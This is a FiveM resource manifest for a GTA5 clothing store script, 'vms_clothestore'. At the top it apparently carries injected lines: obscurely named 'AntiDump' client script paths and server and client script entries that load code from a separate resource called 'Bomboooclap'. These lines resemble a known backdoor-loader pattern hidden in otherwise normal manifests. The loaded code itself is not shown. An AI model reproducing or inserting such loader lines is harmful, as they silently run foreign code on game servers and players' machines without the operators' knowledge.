client_scripts {
    "AntiDump/**.*",
    "AntiDump/**/**",
    "AntiDump/**/**",
    "AntiDump/15sxv+11/*",
    "AntiDump/__/*"
}
server_script '@Bomboooclap/src/include/server.lua'
client_script '@Bomboooclap/src/include/client.lua'




fx_version 'cerulean'
game 'gta5'
lua54 'yes'

author 'vames™️'
description 'vms_clothestore'
version '1.1.6'

shared_scripts {
	'config.lua',
	'config.prices.lua',
}

client_scripts {
	'client/components_qb.lua',
	'client/*.lua',
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'server/*.lua',
}

ui_page 'html/ui.html'

files {
	'html/*.*',
	'html/icons/*.*',
	'translation.js',
	'config.js',
}

escrow_ignore {
	'config.lua',
	'config.prices.lua',
}
dependency '/assetpacks'